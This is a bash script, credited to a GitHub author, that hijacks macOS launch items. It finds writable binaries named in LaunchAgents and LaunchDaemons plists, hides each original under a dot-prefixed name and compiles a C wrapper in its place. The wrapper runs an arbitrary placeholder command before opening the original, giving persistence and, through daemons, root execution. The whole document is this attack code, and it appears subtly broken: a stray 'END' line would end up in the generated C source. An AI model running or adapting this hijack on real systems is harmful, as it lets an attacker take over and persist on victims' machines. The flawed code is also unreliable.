#!/bin/bash
#By Shellbear Github.com/shellbear

ls -1 ~/Library/LaunchAgents | while read line; do 
item=$(cat ~/Library/LaunchAgents/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done

ls -1 /Library/LaunchDaemons | while read line; do 
item=$(cat /Library/LaunchDaemons/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done

ls -1 /Library/LaunchAgents | while read line; do 
item=$(cat /Library/LaunchAgents/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done